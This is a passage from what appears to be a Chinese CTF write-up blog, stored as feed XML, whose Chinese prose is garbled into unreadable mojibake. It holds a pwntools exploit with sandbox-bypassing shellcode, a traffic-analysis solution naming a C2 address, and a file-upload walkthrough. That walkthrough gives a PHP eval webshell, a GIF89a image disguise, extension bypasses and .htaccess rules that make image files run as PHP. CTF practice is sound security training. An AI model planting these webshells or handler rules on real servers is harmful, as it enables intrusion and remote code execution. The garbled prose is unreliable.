*)(i + <span class="number">1</span> + a1) == <span class="number">5</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œå°±æ˜¯æ£€æŸ¥ <code>\x0f\x05</code>å­—èŠ‚ç çš„ä¸ªæ•°ï¼Œè¿™åˆšå¥½æ˜¯ syscallçš„å­—èŠ‚ç ï¼Œå› æ­¤æˆ‘ä»¬çš„shellcodeä»…èƒ½åŒ…å«ä¸¤æ¬¡syscallã€‚</p><p>æ‹¿ä¸Šä¹‹å‰åœ¨2024BaseCTFé‡Œé¢çš„è„šæœ¬ç›´æ¥æ¢­å³å¯ï¼Œé¸£è°¢ <code>gets</code>å¸ˆå‚…ã€‚</p><p>ï¼ˆå¯å‚è€ƒï¼š<a href="https://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/%EF%BC%89">https://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/ï¼‰</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line"><span class="comment">#p = remote(&quot;gz.imxbt.cn&quot;,20551)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment">#libc = ELF(libc)</span></span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 7</span></span><br><span class="line"><span class="string">    mov rax, 0x101</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,3   </span></span><br><span class="line"><span class="string">    mov rdx,0</span></span><br><span class="line"><span class="string">    mov r10,0x100</span></span><br><span class="line"><span class="string">    push 40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;MADE IN HEAVEN !!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">sd(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121002148752.png" alt="image-20250121002148752"></p><h1 id="IOT-blink"><a href="#IOT-blink" class="headerlink" title="IOT-blink"></a>IOT-blink</h1><p>ç›´æ¥æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œæœ‰ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„ï¼Œå¾ˆæŠ½è±¡ã€‚</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121002434862.png" alt="image-20250121002434862"></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rtosandmorseisveryeasyhahhaha</span><br></pre></td></tr></table></figure></div><h1 id="sharkp"><a href="#sharkp" class="headerlink" title="sharkp"></a>sharkp</h1><p>å‚è€ƒæ–‡ç« ï¼š<a class="link" href="https://la13x.github.io/2024/01/24/MSF-C2/#32%E4%BD%8D">https://la13x.github.io/2024/01/24/MSF-C2/#32%E4%BD%8D <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å°æçš„æ‘„åƒå¤´è¢«é»‘å®¢å…¥ä¾µäº†ï¼Œä½†åªæ•è·åˆ°äº†å•å‘çš„æµé‡åŒ…ï¼Œè¯·åˆ†ææ‘„åƒå¤´å›ºä»¶ä¸å¯¹åº”çš„æµé‡ï¼Œå›ç­”ä»¥ä¸‹é—®é¢˜ï¼š</span><br><span class="line">1.æ”»å‡»è€…åˆ©ç”¨æ‘„åƒå¤´å“ªä¸ªæ¥å£å®ç°çš„RCEï¼Ÿ</span><br><span class="line">2.æ”»å‡»è€…å›è¿çš„C2æœåŠ¡å™¨ipåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ</span><br><span class="line">flagæ ¼å¼ï¼šflag&#123;æ¥å£åç§°_ipåœ°å€&#125;  ä¾‹ï¼šflag&#123;qweasd_127.0.0.1&#125;</span><br></pre></td></tr></table></figure></div><p>å…ˆæŸ¥çœ‹æµé‡åŒ…ï¼Œåªéœ€æŸ¥çœ‹httpå³å¯</p><p>ç”±äºæ˜¯å•å‘çš„æµé‡åŒ…ï¼Œä½†æ˜¯åœ¨å…¶ä¸­æœ‰ä¸€ä¸ªè¿”å›ç»™æœåŠ¡å™¨çš„æµé‡åŒ…ï¼Œç‚¹å‡»æŸ¥çœ‹ä¸€ä¸‹ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121132949286.png" alt="image-20250121132949286"></p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121133030743.png" alt="image-20250121133030743"></p><p>å‘ç°æœ‰ä¸ªELFæ–‡ä»¶ï¼Œdumpä¸‹æ¥ä¸¢åˆ°idaæŸ¥çœ‹ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121133230557.png" alt="image-20250121133230557"></p><p>éƒ¨åˆ†ä»£ç å¦‚ä¸Šï¼Œå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªmipsä¸‹çš„shellcodeï¼Œå¾€ä¸‹é¢çœ‹ä¸€ç‚¹ä¹Ÿæ˜¯å¯ä»¥çœ‹åˆ° <code>/bin</code>å‡ºç°çš„</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121140806191.png" alt="image-20250121140806191"></p><p>è€Œè¦æ±‚çš„C2å›è¿åœ°å€å°±æ˜¯ç¬¬ä¸€å¼ å›¾ç‰‡çš„å…‰æ ‡å¤„,å¯ä»¥å‚è€ƒå¼€å¤´çš„æ–‡ç« å¯ä»¥çŒœæµ‹ã€‚</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121141831254.png" alt="image-20250121141831254"></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">115.195.88.161</span><br></pre></td></tr></table></figure></div><p>ä¹Ÿå¯ä»¥ä¸¢è¿›å®‰æ’äº‘æ²™ç®±</p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121142430291.png" alt="image-20250121142430291"></p><ul><li>ä¸‹é¢æ‰¾æ¥å£ï¼Œåœ¨ä¸Šè¿°çš„æµé‡åŒ…ä¸Šæ–¹å‘ç°æœ‰ä¸ªPOSTçš„åŒ…ï¼Œç‚¹è¿›å»çœ‹ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121142729159.png" alt="image-20250121142729159"></p><p><img lazyload src="/images/loading.svg" data-src="/../image-20250121142715813.png" alt="image-20250121142715813"></p><p>å¾ˆæ˜æ˜¾RCEå°±æ˜¯åˆ©ç”¨è¿™ä¸ª <code>setSystemAdmin</code>æ¥å£</p><p>é‚£ä¹ˆflagå°±æ˜¯<code>flag&#123;setSystemAdmin_115.195.88.161&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2024/12/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2024/12/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h1><h2 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a>ä¸€å¥è¯æœ¨é©¬</h2><ul><li>æ‰“å¼€ä¾¿æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼š</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206171443704.bmp"></p><h2 id="ä¿®æ”¹content-type"><a href="#ä¿®æ”¹content-type" class="headerlink" title="ä¿®æ”¹content-type"></a>ä¿®æ”¹content-type</h2><ul><li>å°è¯•æŠ“åŒ…ä¿®æ”¹<code>Content-Type</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206171934703.bmp"></p><h2 id="phpåç¼€ç»•è¿‡"><a href="#phpåç¼€ç»•è¿‡" class="headerlink" title="phpåç¼€ç»•è¿‡"></a>phpåç¼€ç»•è¿‡</h2><ul><li>å°è¯•ä¿®æ”¹åç¼€ç»•è¿‡</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.phtml .php1 .php2 .phar</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206172413740.bmp"></p><p>åˆæ˜¾ç¤ºfileé‡Œé¢ä¸èƒ½åŒ…å«<code>&lt;?</code>,ç»§ç»­ä¿®æ”¹æ–‡ä»¶</p><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡&lt;?"></a>ç»•è¿‡&lt;?</h2><ul><li>ä½¿ç”¨js+phpæ¥ç»•è¿‡æ£€æŸ¥</li></ul><p><mark>è¿™é‡Œéœ€è¦æ³¨æ„phpçš„ç‰ˆæœ¬è¦å¤§äº5.4<mark></mark></mark></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>];&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>ä½†æ˜¯æ˜¾ç¤ºä¸æ˜¯å›¾åƒ:</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206173458188.bmp"></p><h2 id="æ·»åŠ GIFå¤´æ¥ä¼ªè£…"><a href="#æ·»åŠ GIFå¤´æ¥ä¼ªè£…" class="headerlink" title="æ·»åŠ GIFå¤´æ¥ä¼ªè£…"></a>æ·»åŠ GIFå¤´æ¥ä¼ªè£…</h2><p>åœ¨æ–‡ä»¶çš„å¤´éƒ¨æ·»åŠ <code>GIF89a</code>å¯ä»¥ä¼ªè£…ä¸ºgifå›¾åƒ,ä½†æ˜¯æœ¬è´¨è¿˜æ˜¯phpæ–‡ä»¶</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">GIF89</span>a;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><p>å›¾ç‰‡ä¸­å°‘äº†æ‹¬å·</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206173703393.bmp"></p><p>ok!ä¸Šä¼ æˆåŠŸ</p><h2 id="æŸ¥çœ‹æ–‡ä»¶"><a href="#æŸ¥çœ‹æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶"></a>æŸ¥çœ‹æ–‡ä»¶</h2><p>ä¸€èˆ¬ä¸Šä¼ çš„æ–‡ä»¶éƒ½æ˜¯åœ¨&#x2F;uploadè·¯å¾„ä¸‹é¢</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206173844462.bmp"></p><h2 id="èšå‰‘è¿æ¥â¤ï¸â¤ï¸"><a href="#èšå‰‘è¿æ¥â¤ï¸â¤ï¸" class="headerlink" title="èšå‰‘è¿æ¥â¤ï¸â¤ï¸"></a>èšå‰‘è¿æ¥â¤ï¸â¤ï¸</h2><p>å¯†ç å°±æ˜¯POSTé‡Œé¢çš„å‚æ•°</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206181338166.bmp"></p><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><ul><li>æ­¥éª¤å’Œä¸Šä¸€é“é¢˜ç›®ä¸€æ ·ï¼Œå¼€å§‹ç›´æ¥ä¼ å…¥ç®€å•çš„ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åè¯´åç¼€ä¸èƒ½å«æœ‰phï¼Œé‚£ä¹ˆå’Œä¸Šä¸€é“é¢˜ç›®ä¸€æ ·ä¿®æ”¹<code>content-type</code>ä¸º<code>image/png</code>ï¼Œshell1çš„åç¼€ä¹Ÿæ”¹ä¸º<code>png</code>ï¼Œä½†æ˜¯æ˜¾ç¤ºå¤ªéœ²éª¨</li><li>æ­¤æ—¶åˆ‡æ¢åç¼€ä¸º<code>jpg</code>,<code>content-type</code>ä¸º<code>image/jpeg</code>ï¼Œæ­¤æ—¶å¯ä»¥ç»•è¿‡åç¼€ï¼Œä½†æ˜¯è¿˜æ˜¯å’Œä¸Šä¸€é“é¢˜ç›®ä¸€æ ·ï¼Œä¹Ÿæ˜¯é™åˆ¶äº†<code>&lt;?</code>ï¼Œäºæ˜¯æˆ‘ä»¬ä¼ å…¥å’Œä¸Šä¸€é¢˜ä¸€æ ·çš„æœ¨é©¬ï¼Œå°±å¯ä»¥ä¸Šä¼ æˆåŠŸäº†ï¼Œè¿™é‡Œä¸€æ ·è¦æ³¨æ„phpç‰ˆæœ¬ï¼š</li></ul><p>çœ‹ä¸‹æ–¹çš„phpç‰ˆæœ¬æ˜æ˜¾&gt;5.4</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206194258070.bmp"></p><p>ä¸‹é¢çœ‹ä¼ å…¥æˆåŠŸçš„è®°å½•ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206192110631.bmp"></p><p>çœ‹æ ·å­æ˜¯ä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯ä½ å»è®¿é—®è¿™ä¸ªè·¯å¾„çš„æ—¶å€™ï¼Œ<strong>å¾—åˆ°çš„æ˜¯ä¸€ä¸ªjpgçš„å›¾åƒ</strong>ï¼Œè¿™ä¸æˆ‘ä»¬ä¼ å…¥phpæ–‡ä»¶çš„æƒ³æ³•èƒŒé“è€Œé©°ï¼Œè¿™é‡Œè¯´æ˜è¯¥æœåŠ¡å™¨ä¸å°†è¯¥jpgæ–‡ä»¶è§£æä¸ºphpæ–‡ä»¶ï¼Œé‚£ä¹ˆå¦‚ä½•ä¿®æ”¹å‘¢ï¼Ÿå¦‚ä¸‹ï¼š</p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><blockquote><h3 id="1-ä»€ä¹ˆæ˜¯-htaccess-æ–‡ä»¶ï¼Ÿ"><a href="#1-ä»€ä¹ˆæ˜¯-htaccess-æ–‡ä»¶ï¼Ÿ" class="headerlink" title="1.ä»€ä¹ˆæ˜¯ .htaccess æ–‡ä»¶ï¼Ÿ"></a><strong>1.ä»€ä¹ˆæ˜¯ <code>.htaccess</code> æ–‡ä»¶ï¼Ÿ</strong></h3><p><code>.htaccess</code> æ˜¯ Apache HTTP æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºä¸ºç‰¹å®šç›®å½•å®šä¹‰è§„åˆ™ï¼Œè¦†ç›–å…¨å±€é…ç½®ã€‚å¸¸ç”¨çš„åŠŸèƒ½åŒ…æ‹¬ï¼š</p><ul><li>URL é‡å†™</li><li>æ–‡ä»¶è®¿é—®æ§åˆ¶</li><li>MIME ç±»å‹å®šä¹‰</li><li>ç›®å½•ç´¢å¼•æ§åˆ¶</li></ul><p>åœ¨ç‰¹å®šæƒ…å†µä¸‹ï¼Œä¸Šä¼ è‡ªå®šä¹‰çš„ <code>.htaccess</code> æ–‡ä»¶å¯ä»¥ç”¨æ¥æ”¹å˜æœåŠ¡å™¨çš„è¡Œä¸ºï¼Œç”šè‡³æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><h3 id="2-htaccess-å¸¸è§ç”¨é€”"><a href="#2-htaccess-å¸¸è§ç”¨é€”" class="headerlink" title="2. .htaccess å¸¸è§ç”¨é€”"></a><strong>2. <code>.htaccess</code> å¸¸è§ç”¨é€”</strong></h3><h4 id="2-1-ä¿®æ”¹æ–‡ä»¶è§£æè§„åˆ™"><a href="#2-1-ä¿®æ”¹æ–‡ä»¶è§£æè§„åˆ™" class="headerlink" title="2.1 ä¿®æ”¹æ–‡ä»¶è§£æè§„åˆ™"></a><strong>2.1 ä¿®æ”¹æ–‡ä»¶è§£æè§„åˆ™</strong></h4><p>é€šè¿‡æ›´æ”¹ MIME ç±»å‹æˆ–å¤„ç†ç¨‹åºï¼Œå°†é <code>.php</code> æ–‡ä»¶è§£æä¸º PHPã€‚</p><ul><li><p><strong>å¼ºåˆ¶è§£æç‰¹å®šåç¼€ä¸º PHPï¼š</strong></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddType</span> application/x-httpd-php .<span class="property">jpg</span></span><br><span class="line"><span class="title class_">AddType</span> application/x-httpd-php .<span class="property">txt</span></span><br></pre></td></tr></table></figure></div><p>ä¸Šä¼ åï¼Œå¯ä»¥å°†ä¼ªè£…çš„å›¾ç‰‡æˆ–æ–‡æœ¬æ–‡ä»¶ä½œä¸º PHP æ‰§è¡Œã€‚</p><p><strong>è®¿é—®æ–¹å¼ï¼š</strong></p><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/upload/shell.jpg</span><br></pre></td></tr></table></figure></div></li><li><p><strong>ç‰¹å®šæ–‡ä»¶åŒ¹é…ï¼š</strong></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;\.jpg$&quot;</span>&gt;</span><br><span class="line">    <span class="title class_">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure></div><p>ä»…å°† <code>.jpg</code> æ–‡ä»¶æŒ‰ PHP è§£æã€‚</p></li></ul><hr><h4 id="2-2-æ–‡ä»¶åŒ…å«ç»•è¿‡"><a href="#2-2-æ–‡ä»¶åŒ…å«ç»•è¿‡" class="headerlink" title="2.2 æ–‡ä»¶åŒ…å«ç»•è¿‡"></a><strong>2.2 æ–‡ä»¶åŒ…å«ç»•è¿‡</strong></h4><p>å¦‚æœç›®æ ‡æœåŠ¡å™¨é€šè¿‡é»‘åå•è¿‡æ»¤æŸäº›æ–‡ä»¶æ‰©å±•åï¼ˆå¦‚ <code>.php</code>ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨ <code>.htaccess</code> æ”¹å˜æ–‡ä»¶è§£ææ–¹å¼ã€‚</p><ul><li><p>ç¤ºä¾‹ï¼š</p><p>ä¸Šä¼  <code>.htaccess</code>æ–‡ä»¶ï¼Œå°†ç‰¹å®šæ‰©å±•åæ˜ å°„ä¸º PHPï¼š</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddHandler</span> application/x-httpd-php .<span class="property">shell</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åä¸Šä¼  <code>shell.shell</code>æ–‡ä»¶å°†è¢«è§£æä¸º PHPã€‚</p></li></ul><hr><h4 id="2-3-ç¦ç”¨ç›®å½•ç´¢å¼•"><a href="#2-3-ç¦ç”¨ç›®å½•ç´¢å¼•" class="headerlink" title="2.3 ç¦ç”¨ç›®å½•ç´¢å¼•"></a><strong>2.3 ç¦ç”¨ç›®å½•ç´¢å¼•</strong></h4><p>é€šè¿‡ç¦ç”¨ç›®å½•åˆ—è¡¨åŠŸèƒ½éšè—æ–‡ä»¶ç»“æ„ï¼š</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Options</span> -<span class="title class_">Indexes</span></span><br></pre></td></tr></table></figure></div><ul><li>å¦‚æœç›®æ ‡å¼€å¯ç›®å½•ç´¢å¼•ï¼Œæ¸—é€è€…å¯èƒ½åˆ©ç”¨æ­¤åŠŸèƒ½å‘ç°æ•æ„Ÿæ–‡ä»¶ã€‚é€šè¿‡ä¸Šä¼  <code>.htaccess</code>ï¼Œå¯ä»¥ç¦ç”¨ç›®å½•åˆ—è¡¨ã€‚</li></ul><hr><h4 id="2-4-URL-é‡å†™"><a href="#2-4-URL-é‡å†™" class="headerlink" title="2.4 URL é‡å†™"></a><strong>2.4 URL é‡å†™</strong></h4><p>åˆ©ç”¨ URL é‡å†™è§„åˆ™è¿›è¡Œè·¯å¾„ä¼ªè£…æˆ–è®¿é—®æ§åˆ¶ã€‚</p><ul><li><p><strong>ä¼ªè£…è·¯å¾„ï¼š</strong></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">RewriteEngine</span> <span class="title class_">On</span></span><br><span class="line"><span class="title class_">RewriteRule</span> ^admin$ /login.<span class="property">php</span> [L]</span><br></pre></td></tr></table></figure></div></li><li><p><strong>ç»•è¿‡è®¿é—®é™åˆ¶ï¼š</strong> å¦‚æœç›®æ ‡ç³»ç»ŸåŸºäºè·¯å¾„æ§åˆ¶è®¿é—®æƒé™ï¼Œå¯ä»¥ç”¨ <code>.htaccess</code> ä¿®æ”¹è®¿é—®è·¯å¾„ï¼Œç»•è¿‡é™åˆ¶ã€‚</p></li></ul></blockquote><ul><li>ä¹Ÿå°±æ˜¯è¯´å¦‚æœæ˜¯<code>Apache</code>æœåŠ¡å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ <code>.htaccess</code>å»å°†.pngæˆ–è€….jpgæ–‡ä»¶å¼ºåˆ¶è§£æä¸º<code>.php</code>æ–‡ä»¶ï¼Œè¿™æ ·ä¹Ÿå°±è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„äº†ï¼Œä½†æ˜¯åœ¨ä¸Šé¢phpç‰ˆæœ¬çš„å›¾ç‰‡å·²ç»æ˜¾ç¤ºäº†è¯¥é¢˜ç›®çš„æœåŠ¡å™¨æ˜¯<code>openresty</code>ï¼Œå®ƒçš„æ ¸å¿ƒæ˜¯Nginxï¼Œæ— 